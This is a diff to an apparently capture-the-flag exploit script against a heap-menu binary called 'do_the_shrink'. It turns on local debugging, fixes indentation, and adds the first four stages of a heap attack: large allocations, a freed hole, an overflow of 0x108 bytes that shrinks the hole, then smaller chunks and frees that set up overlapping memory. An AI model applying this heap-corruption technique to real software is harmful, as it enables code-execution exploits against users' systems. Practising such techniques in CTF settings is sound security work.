@@ -17,7 +17,7 @@ do_remote = False
 binary_name = './do_the_shrink'
 
 #for doing local debugging
-is_local_dbg = False
+is_local_dbg = True
 gdb_script = '''
 set pagination off
 set disassembly-flavor intel
@@ -61,9 +61,9 @@ def delete_boot(target, index):
 
 def read_boot(target, index):
     if(is_local_dbg):
-		target.sendlineafter('> ', '3')
-    	target.sendlineafter('today?', str(index))
-    	return target.recvuntil('1.')
+        target.sendlineafter('> ', '3')
+        target.sendlineafter('today?', str(index))
+        return target.recvuntil('1.')
 
 
 def edit_boot(target, index, material):
@@ -89,25 +89,34 @@ def stage_0_groom_the_heap(target):
 
 def stage_1_create_large_boots(target):
     #for debugging, lets read the boots here after stage
+    create_new_boot(target, 0x100, '11111')
+    create_new_boot(target, 0x208, '22222')
+    create_new_boot(target, 0x100, '33333')
     print 'Stage 1: Large Boots Allocated'
     read_boot(target, 0)
 
 
 def stage_2_create_and_shrink(target):
+    delete_boot(target, 1)
     print 'Stage 2: Hole Created'
     read_boot(target, 0)
+    edit_boot(target, 0, 0x108*'A')
     print 'Stage 2: Hole Overflowed'
     read_boot(target, 0)
 
 
 def stage_3_make_smaller_chunks_in_freed_block(target):
     #for debugging, lets read the boots here after stage
+    create_new_boot(target, 0x100, '44444')
+    create_new_boot(target, 0x70, '55555') #making this 0x70 instead of 0x80 because 0x80 doesn't make a fastbin chunk
     print 'Stage 3: Hole Overwritten'
     read_boot(target, 0)
 
 
 def stage_4_free_blocks(target):
     #for debugging, lets read the boots here after stage
+    delete_boot(target, 2) #delete 4 above
+    delete_boot(target, 3) #delete last block 3 above
     print 'Stage 4: Last Boots Deleted'
     read_boot(target, 0)
 
